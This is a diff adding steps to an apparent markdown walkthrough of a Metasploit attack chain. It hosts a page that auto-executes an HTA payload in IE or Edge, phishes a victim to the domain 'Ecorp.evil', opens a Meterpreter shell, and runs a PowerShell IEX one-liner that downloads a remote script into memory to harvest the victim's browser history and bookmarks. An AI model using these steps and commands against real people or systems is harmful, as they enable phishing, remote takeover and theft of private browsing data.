@@ -55,7 +55,9 @@ The `-t` was for output format but in `msf5>` it is `-f`
 
 The `-f` was for output filename but in `msf5>` it is `-o`
 
-**[+] Simple HTML page** to server the HTA file just created.
+
+## 2. HTA File is Executed
+**[+] Simple HTML page** to serve the HTA file just created.  Name it whatever but for here it will be refered to as `index.html`.
 
 *Auto Execute* will only take place in IE and Edge browsers.
 
@@ -71,12 +73,30 @@ The `-f` was for output filename but in `msf5>` it is `-o`
 </html>
 ```
 
-
-
-## 2. HTA File is Executed
+1. Serve `index.html` via any means, but the below works just fine.  
+```python
+python -m SimpleHTTPServer 8080
+```
+2. Send the victim a link or some phish.
+3. Victim goes to `http://Ecorp.evil/index.html` cause they aren't paying attention to the domain name.
+4. When `index.html` loads IF browser is IE or Edge it will execute the `patch.hta` file, and if everthing was set up properly, connect back to the `msf` session.  Check `jobs` and `sessions` to see if it worked.
+5. [maybe] The victim may need to allow the file to execute.  But why not? They cliked on a **`Ecorp.evil`** link, right?
 
 
 ## 3. Meterpreter Session
 
+Now you should have a meterperter session.  If not, what did you do wrong? Seriously.... I laid everything out for you.
+
+Interact with the session: `sessions -i 1`
+Start a Shell: `shell`
+
 
 ## 4. Malicous Code Injection
+
+To enumerate browser history & bookmarks, inject `Get-BrowserData` into the victim's memory.
+
+Execute the following in the `shell` session started in #3 above.
+
+```powershell
+C:\Users\FrankCastle\> powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Get-BrowserData.ps1'); Get-BrowserData | Format-List"
+```
